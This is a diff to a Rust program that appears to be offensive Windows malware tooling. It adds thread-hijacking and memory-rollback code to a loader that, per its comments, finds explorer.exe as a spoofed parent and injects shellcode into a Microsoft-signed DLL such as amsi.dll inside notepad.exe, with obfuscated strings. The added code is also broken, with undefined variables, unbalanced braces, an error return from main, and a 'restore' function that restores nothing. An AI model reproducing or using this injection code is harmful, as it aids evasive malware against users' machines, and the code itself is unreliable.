@@ -191,10 +191,46 @@ struct Process {
 
 }
 
+//HoLAI
+// Function to rollback changes
+fn rollback_changes(original_memory: &[u8], context: &CONTEXT, h_thread: HANDLE, h_process: HANDLE) {
+    // Restore the original memory
+    unsafe {
+        WriteProcessMemory(h_process, context.Rip as *mut _, original_memory.as_ptr() as *const _, original_memory.len(), std::ptr::null_mut());
+    }
+    // Restore the original context moved to shellcode
+}
 
+// Function to save and restore thread context
+fn save_and_restore_thread_context(h_thread: HANDLE) -> Result<(), &'static str> {
+    let mut context: CONTEXT = unsafe { std::mem::zeroed() };
+    context.ContextFlags = CONTEXT_FULL;
+    // Save the current thread context
+    let status = unsafe { GetThreadContext(h_thread, &mut context) };
+    if status == 0 {
+        return Err("Failed to get thread context");
+    }
+    // Restore the original thread context moved to shellcode
+    Ok(())
+}
+//HoLAI
 fn main() {
 
-
+    //HoLAI
+    // Single execution control
+        static PAYLOAD_EXECUTED: AtomicBool = AtomicBool::new(false);
+    if !PAYLOAD_EXECUTED.compare_and_swap(false, true, Ordering::SeqCst) {
+        // Hijack the thread
+        match jmp_hijack_thread(hThread, injection_address as PVOID, handle) {
+            Ok(_) => println!("[+] Thread hijacking successful"),
+            Err(e) => {
+                log_error("Failed to hijack thread:", e);
+                rollback_changes(&original_memory, &context, hThread, handle);  // Pass required parameters
+                return Err(e);
+            }
+        };
+    //HoLAI
+    
     // Step 1: Obtain the process ID of explorer.exe. 
     println!("{}", lc!("[+] Getting Parent Process PID:"));
     let explorer_pid = match get_process_id_by_name("explorer.exe") {
@@ -233,7 +269,7 @@ fn main() {
     // Inject the shellcode into the Microsoft Signed DLL inside the target process (e.g notepad.exe -> amsi.dll)
 
     let _ = inject_shellcode(&mut process);
-
+    
 }
 
 
